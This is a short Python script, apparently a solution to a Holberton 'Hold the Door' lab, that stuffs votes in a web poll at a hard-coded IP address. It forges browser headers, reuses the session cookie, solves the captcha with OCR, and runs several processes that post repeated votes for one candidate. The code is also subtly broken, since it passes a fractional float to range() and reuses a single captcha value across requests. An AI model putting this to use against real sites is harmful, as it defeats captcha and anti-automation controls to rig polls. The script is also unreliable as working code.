#!/usr/bin/python3


from PIL import Image
from io import BytesIO
from requests import post, get
from multiprocessing import Process
from pytesseract import image_to_string

# Number of votes
votes = 23

# Number of voters, be carefull this number depend of pc's memory ram
voters = 10

# Holberton ID
candidate = 5

# This is a url where we want to scraping
url = 'http://158.69.76.135/level2.php'

#This is the captchap
url_captcha = 'http://158.69.76.135/captcha.php'

dict_data = {
    'id': candidate,
    'holdthedoor': 'submit',
    'key': '',
    'captcha': ''
}

dict_cookie = {'HoldTheDoor': ''}

dict_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
        "Referer": url,
    }

if voters > votes:
    raise ValueError("Number of voters can't be greater than votes")

res = post(url)
header = res.cookies
cookie = header.get('HoldTheDoor')

dict_data['key'] = cookie
dict_cookie['HoldTheDoor'] = cookie

n_votes_per_process = votes / voters

if votes % voters != 0:
    manual_vote = (votes / voters) - int(n_votes_per_process)

    for i in range(manual_vote):

        captcha = Image.open(BytesIO(get(url_captcha).content))
        dict_data['captcha'] = image_to_string(captcha).strip()

        resp = post(url, data=dict_data, cookies=dict_cookie, headers=dict_header)


n_votes_per_process = int(n_votes_per_process)


def _vote():
    """This function is called when we try to vote"""

    for i in range(n_votes_per_process):
        print("{} votes".format(i))
        resp = post(url, data=dict_data, cookies=dict_cookie, headers=dict_header)

if __name__ == '__main__':

    jobs = []

    for i in range(voters):
        p = Process(target=_vote)
        jobs.append(p)
        p.start()
